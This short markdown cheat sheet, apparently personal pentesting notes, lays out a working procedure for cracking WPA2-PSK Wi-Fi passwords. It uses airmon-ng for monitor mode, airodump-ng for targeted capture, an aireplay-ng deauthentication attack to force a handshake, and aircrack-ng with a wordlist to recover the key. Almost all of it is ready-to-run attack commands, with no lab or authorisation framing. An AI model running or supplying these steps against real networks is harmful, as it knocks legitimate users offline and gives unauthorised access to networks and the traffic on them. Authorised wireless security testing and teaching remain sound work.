# wifi

This method can be use to crack **WPA2-PSK** that utilizes a **pre-shared-key for authentication**.
## Methodology

### Step1: start adapter on monitor mode
1. Adapter check: `iwconfig`
   1. Kill active process: `airmon-ng check kill`
2. Start adapter on monitor mode: `airmon-ng start wlan0`
3. Start basic scan: `airodump-ng INTERFACE`
   1. Note down BSSID, CHANNEL, ESSID

## Step2: start attack

1. start focussed scan: `airodump-ng INTERFACE -c CHANNEL --bssid BSSID [-w FILE]`
2. Should see traffic being recorded. Our aim is to capture a connection.
3. Send DeAuth: `aireplay-ng INTERFACE -0 1 [-c STATION-TO-DEAUTH]`
   1. `-0 1` means to deauth once.
4. Capture the connection

## Step3: Cracking

1. `aircrack-ng FILE -b BSSID -w WORDLIST`